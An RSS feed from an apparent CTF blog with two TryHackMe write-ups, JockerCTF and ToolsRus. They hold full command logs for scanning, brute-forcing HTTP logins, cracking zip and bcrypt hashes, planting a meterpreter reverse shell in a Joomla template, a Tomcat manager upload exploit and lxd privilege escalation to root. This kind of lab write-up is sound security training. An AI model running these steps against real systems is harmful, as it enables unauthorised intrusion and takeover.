<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.12</generator><lastBuildDate>Tue, 07 Apr 2020 21:10:32 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>JockerCTF | write-up</title><description>&lt;p&gt;Hello world, I hope you are all well and safe home from the epidemic, today's challenge is a CTF by Tryhackme is rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/jockerctf-write-up/</link><guid isPermaLink="false">5e8caabb75832c27370ae6e1</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 07 Apr 2020 16:31:26 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/joker.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/joker.jpg" alt="JockerCTF | write-up"&gt;&lt;p&gt;Hello world, I hope you are all well and safe home from the epidemic, today's challenge is a CTF by Tryhackme is rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sV -sC 10.10.215.43 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 16:30 UTC
Nmap scan report for ip-10-10-215-43.eu-west-1.compute.internal (10.10.215.43)
Host is up (0.0010s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
8080/tcp open  http    Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
MAC Address: 02:9E:D8:EE:E7:2C (Unknown)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.31.50.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.32.05.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/12qASHliHqDPSo" width="328" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/joker-12qASHliHqDPSo"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;well well well, we have three ports &lt;strong&gt;ssh&lt;/strong&gt; on 22 and some &lt;strong&gt;apache&lt;/strong&gt; on 80 and 8080, It seems that we need credentials to access something in port 8080.&lt;/p&gt;&lt;p&gt;we'll dig more in port 80 and see if we have any interesting directories and files.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# dirb http://10.10.215.43/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Apr  7 16:37:56 2020
URL_BASE: http://10.10.215.43/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.215.43/ ----
==&amp;gt; DIRECTORY: http://10.10.215.43/css/                                            
==&amp;gt; DIRECTORY: http://10.10.215.43/img/                                            
+ http://10.10.215.43/index.html (CODE:200|SIZE:5954)                              
+ http://10.10.215.43/phpinfo.php (CODE:200|SIZE:94848)                            
+ http://10.10.215.43/server-status (CODE:403|SIZE:277)  &lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code class="language-markup"&gt;root@kali:~# dirb http://10.10.215.43/ -X .txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Apr  7 16:38:47 2020
URL_BASE: http://10.10.215.43/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.txt) | (.txt) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.215.43/ ----
+ http://10.10.215.43/secret.txt (CODE:200|SIZE:320)                               
                                                                                   
-----------------
END_TIME: Tue Apr  7 16:38:49 2020
DOWNLOADED: 4612 - FOUND: 1
root@kali:~# &lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.40.16.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;And we have a secret conversation between Batman and the Joker, checking other directories and backend php file info doesn't give us anything for now ...&lt;/p&gt;&lt;p&gt;our next shot, some bruteforcing in port 8080 and using Batman or Joker as a username and see what we get.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.30.39.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Xhydra is the GUI version of hydra, both of them work fine. But I choose the GUI version because it was faster and less troubleshooting for my machine.&lt;/p&gt;&lt;p&gt;the password used by Joker is h****h, with dirbuster or dirb or gobuster we can't look for directories so we will use nikto with the credentials, and see if we can do anything with them 🙃&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nikto -h http://10.10.215.43:8080/ -id joker:h****h
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.215.43
+ Target Hostname:    10.10.215.43
+ Target Port:        8080
+ Start Time:         2020-04-07 18:31:07 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ / - Requires Authentication for realm ' Please enter the password.'
+ Successfully authenticated to realm ' Please enter the password.' with user-supplied credentials.
+ Entry '/administrator/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/bin/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cache/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cli/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/components/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/language/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/layouts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/libraries/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/plugins/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 14 entries which should be manually viewed.
+ /backup.zip: Potentially interesting archive/cert file found.
+ /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ Uncommon header 'tcn' found, with contents: choice
+ OSVDB-3092: /web.config: ASP config file is accessible.
+ OSVDB-8193: /index.php?module=ew_filemanager&amp;amp;type=admin&amp;amp;func=manager&amp;amp;pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.
+ OSVDB-3092: /administrator/: This might be interesting...
+ OSVDB-3092: /bin/: This might be interesting...
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3092: /tmp/: This might be interesting...
+ OSVDB-3092: /README: README file found.
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
+ /administrator/index.php: Admin login page/section found.
+ 8719 requests: 0 error(s) and 34 item(s) reported on remote host
+ End Time:           2020-04-07 18:31:43 (GMT0) (36 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we gathered a lot of useful information, the first thing that got my attention was the &lt;strong&gt;backup.zip&lt;/strong&gt; file and the &lt;strong&gt;/administrator&lt;/strong&gt; directory.&lt;/p&gt;&lt;p&gt;After downloading the backup.zip file it was encrypted, but not for so long ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/26xBN6I5tVKveX2wg" width="480" height="256" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/johnwick2-lionsgate-john-wick-26xBN6I5tVKveX2wg"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~/Downloads# zip2john backup.zip &amp;gt; hash
root@kali:~/Downloads# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
h****h           (backup.zip)
1g 0:00:00:00 DONE (2020-04-07 18:34) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thank you Joker for using the same passwords 😶, after decompressing the backup we found a database and a backup of the whole site. &lt;/p&gt;&lt;p&gt;the database contained the credentials to access the running site and that's what we did, our next step will be getting a reverse shell, obviously after we decrypt the admin password... obviously 🙄 &lt;/p&gt;&lt;pre&gt;&lt;code&gt;INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15',&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.45.31.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;" target="_blankroot@kali:~# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
a******4         (?)
1g 0:00:00:14 DONE (2020-04-07 18:48) 0.06997g/s 71.79p/s 71.79c/s 71.79C/s bullshit..bulldogs
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.50.16.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.50.50.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;go to extension, and upload your reverse shell. I created mine with msfvenom the payload &lt;strong&gt;php/meterpreter/reverse_tcp&lt;/strong&gt; exported it as raw php and uploaded it in the error.php file and previewed it from the site and it called back to us.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# msfconsole
[-] ***rting the Metasploit Framework console.../
[-] * WARNING: No database support: No database YAML file
[-] ***
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v5.0.71-dev                          ]
+ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 &amp;gt; use exploit/multi/handler
msf5 exploit(multi/handler) &amp;gt; set payload php/meterpreter/reverse_tcp
payload =&amp;gt; php/meterpreter/reverse_tcp                                              
msf5 exploit(multi/handler) &amp;gt; set lhost 10.10.188.92                                
lhost =&amp;gt; 10.10.188.92                                                               
msf5 exploit(multi/handler) &amp;gt; set lport 7878                                        
lport =&amp;gt; 7878                                                                       
msf5 exploit(multi/handler) &amp;gt; run                                                   
                                                                                    
[*] Started reverse TCP handler on 10.10.188.92:7878                                
[*] Sending stage (38288 bytes) to 10.10.215.43                                     
[*] Meterpreter session 1 opened (10.10.188.92:7878 -&amp;gt; 10.10.215.43:34370) at 2020-04-07 19:00:43 +0000                                                                 
                                                                                    
meterpreter &amp;gt; getuid
Server username: www-data (33)                                                      
meterpreter &amp;gt;                          &lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/UoYA5jnXE5V7u4MJh7" width="480" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/joker-the-dark-knight-washing-hands-UoYA5jnXE5V7u4MJh7"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-20.06.11.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;if we look closer we are part of a group called lxd, for me i just learned what is lxd (linux containers) and how do they work ... I would suggest reading the article that I'll leave at the end, so you can learn more about lxd and the privilege escalation that can be done.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-20.07.56.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code class="language-markup"&gt;$ lxc init myalpine joker -c security.privileged=true
Creating Joker
$ lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true
$ lxc start joker
$ lxc exec ignite /bin/sh
whoami
root&lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/p8EJ11ZuJlIxG" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/reaction-p8EJ11ZuJlIxG"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;That's it for today, stay safe, and HAPPY HACKING!&lt;/p&gt;&lt;figure class="kg-card kg-embed-card"&gt;&lt;blockquote class="wp-embedded-content"&gt;&lt;a href="https://www.hackingarticles.in/lxd-privilege-escalation/"&gt;Lxd Privilege Escalation&lt;/a&gt;&lt;/blockquote&gt;
&lt;script type="text/javascript"&gt;
&lt;!--//--&gt;&lt;![CDATA[//&gt;&lt;!--
		/*! This file is auto-generated */
		!function(d,l){"use strict";var e=!1,o=!1;if(l.querySelector)if(d.addEventListener)e=!0;if(d.wp=d.wp||{},!d.wp.receiveEmbedMessage)if(d.wp.receiveEmbedMessage=function(e){var t=e.data;if(t)if(t.secret||t.message||t.value)if(!/[^a-zA-Z0-9]/.test(t.secret)){var r,a,i,s,n,o=l.querySelectorAll('iframe[data-secret="'+t.secret+'"]'),c=l.querySelectorAll('blockquote[data-secret="'+t.secret+'"]');for(r=0;r&lt;c.length;r++)c[r].style.display="none";for(r=0;r&lt;o.length;r++)if(a=o[r],e.source===a.contentWindow){if(a.removeAttribute("style"),"height"===t.message){if(1e3&lt;(i=parseInt(t.value,10)))i=1e3;else if(~~i&lt;200)i=200;a.height=i}if("link"===t.message)if(s=l.createElement("a"),n=l.createElement("a"),s.href=a.getAttribute("src"),n.href=t.value,n.host===s.host)if(l.activeElement===a)d.top.location.href=t.value}}},e)d.addEventListener("message",d.wp.receiveEmbedMessage,!1),l.addEventListener("DOMContentLoaded",t,!1),d.addEventListener("load",t,!1);function t(){if(!o){o=!0;var e,t,r,a,i=-1!==navigator.appVersion.indexOf("MSIE 10"),s=!!navigator.userAgent.match(/Trident.*rv:11\./),n=l.querySelectorAll("iframe.wp-embedded-content");for(t=0;t&lt;n.length;t++){if(!(r=n[t]).getAttribute("data-secret"))a=Math.random().toString(36).substr(2,10),r.src+="#?secret="+a,r.setAttribute("data-secret",a);if(i||s)(e=r.cloneNode(!0)).removeAttribute("security"),r.parentNode.replaceChild(e,r)}}}}(window,document);
//--&gt;&lt;!]]&gt;
&lt;/script&gt;&lt;iframe sandbox="allow-scripts" security="restricted" src="https://www.hackingarticles.in/lxd-privilege-escalation/embed/" width="600" height="338" title="&amp;#8220;Lxd Privilege Escalation&amp;#8221; &amp;#8212; Hacking Articles" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"&gt;&lt;/iframe&gt;&lt;/figure&gt;</content:encoded></item><item><title>ToolsRus CTF | write-up</title><description>&lt;p&gt;Hello all, todays challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward.&lt;/p&gt;&lt;p&gt;Let's enumerate the machine&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.27.83
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC
Nmap scan report for ip-10-10-27-83.eu-west-1.&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/toolsrus-ctf-write-up/</link><guid isPermaLink="false">5e873c54c0200b446da05df8</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 03 Apr 2020 13:44:52 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg" alt="ToolsRus CTF | write-up"&gt;&lt;p&gt;Hello all, todays challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward.&lt;/p&gt;&lt;p&gt;Let's enumerate the machine&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.27.83
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC
Nmap scan report for ip-10-10-27-83.eu-west-1.compute.internal (10.10.27.83)
Host is up (0.0067s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5d:ea:73:8e:0b:06:60:eb:6f:57:dd:99:f8:33:3d:67 (RSA)
|   256 b6:2c:cb:68:c2:ff:d5:3b:5b:ac:4a:66:b5:d8:6d:33 (ECDSA)
|_  256 93:6c:db:4f:5b:2f:a2:83:1f:3d:b0:f6:5f:03:d7:5f (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
MAC Address: 02:D0:62:08:8F:98 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we have 22 &lt;strong&gt;SSH&lt;/strong&gt;, 80 &lt;strong&gt;HTTP&lt;/strong&gt;, and another &lt;strong&gt;HTTP&lt;/strong&gt; on 1234 running &lt;strong&gt;Tomcat&lt;/strong&gt; and 8009 for &lt;strong&gt;ajp13&lt;/strong&gt; let's have a look what we are dealing with on 80 and check if there's any open directories so we can understand more what we are trying to break&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-03-at-14.44.04.png" class="kg-image" alt="ToolsRus CTF | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# dirb http://10.10.27.83

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Apr  3 13:39:07 2020
URL_BASE: http://10.10.27.83/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.27.83/ ----
==&amp;gt; DIRECTORY: http://10.10.27.83/guidelines/                                      
+ http://10.10.27.83/index.html (CODE:200|SIZE:168)                                
+ http://10.10.27.83/protected (CODE:401|SIZE:458)                                 
+ http://10.10.27.83/server-status (CODE:403|SIZE:299)                             
                                                                                   
---- Entering directory: http://10.10.27.83/guidelines/ ----
+ http://10.10.27.83/guidelines/index.html (CODE:200|SIZE:51)                      
                                                                                   
-----------------
END_TIME: Fri Apr  3 13:39:12 2020
DOWNLOADED: 9224 - FOUND: 4
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-03-at-14.48.35.png" class="kg-image" alt="ToolsRus CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-03-at-14.54.50.png" class="kg-image" alt="ToolsRus CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;and we have a message in directory &lt;strong&gt;/guidelines&lt;/strong&gt; for Mr bob that forgot maybe to update the Tomcat server and another one &lt;strong&gt;/protected&lt;/strong&gt; that tells us that we are visiting the wrong port, that's fine because we have more in port 1234&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-03-at-14.57.36.png" class="kg-image" alt="ToolsRus CTF | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.27.83 http-get /protected
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-03 13:53:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.27.83:80/protected
[80][http-get] host: 10.10.27.83   login: bob   password: xxxxxxx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-03 13:53:19
root@kali:~# &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;so we know the user and we brute forced the password with hydra let's dig more and see what we can do with our results so far&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-03-at-16.46.19.png" class="kg-image" alt="ToolsRus CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;the version we are on it accepts some code execution and already exist in metasploit which means less work for us, It's all-right to be lazy sometimes ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;msf5 exploit(multi/http/tomcat_mgr_upload) &amp;gt; show options 

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  xxxxxxx          no        The password for the specified username
   HttpUsername  bob              no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.10.27.83      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
   RPORT         1234             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.152.253    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf5 exploit(multi/http/tomcat_mgr_upload) &amp;gt; run

[*] Started reverse TCP handler on 10.10.152.253:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying kDC5cLvVGr0Ljgc6SbP4zI0e0sf...
[*] Executing kDC5cLvVGr0Ljgc6SbP4zI0e0sf...
[*] Undeploying kDC5cLvVGr0Ljgc6SbP4zI0e0sf ...
[*] Sending stage (53906 bytes) to 10.10.27.83
[*] Meterpreter session 1 opened (10.10.152.253:4444 -&amp;gt; 10.10.27.83:47080) at 2020-04-03 14:12:10 +0000

meterpreter &amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/oKzYzmKjlPgEU" width="480" height="420" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/reactiongifs-oKzYzmKjlPgEU"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;aaand we have a shell, so technically what happened the script logged in went to &lt;strong&gt;/manager &lt;/strong&gt;and uploaded a war file and gave us an easy lazy reverse shell and not any shell a &lt;strong&gt;root&lt;/strong&gt; user shell ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getuid
Server username: root
meterpreter &amp;gt; shell
Process 4 created.
Channel 4 created.
ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
python -c 'import pty;pty.spawn("/bin/bash")'
root@ip-10-10-27-83:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-10-27-83:/#&lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/WuGSL4LFUMQU" width="480" height="374" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/oooh-WuGSL4LFUMQU"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@ip-10-10-27-83:~# ls -la /root
ls -la /root
total 40
drwx------  5 root root 4096 Mar 11  2019 .
drwxr-xr-x 23 root root 4096 Apr  3 13:34 ..
-rw-------  1 root root   47 Mar 11  2019 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root   33 Mar 11  2019 flag.txt
drwxr-xr-x  2 root root 4096 Mar 11  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  3 root root 4096 Mar 10  2019 snap
drwx------  2 root root 4096 Mar 10  2019 .ssh
-rw-------  1 root root  658 Mar 11  2019 .viminfo
root@ip-10-10-27-83:~# cat /root/flag.txt
cat /root/flag.txt
ffxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
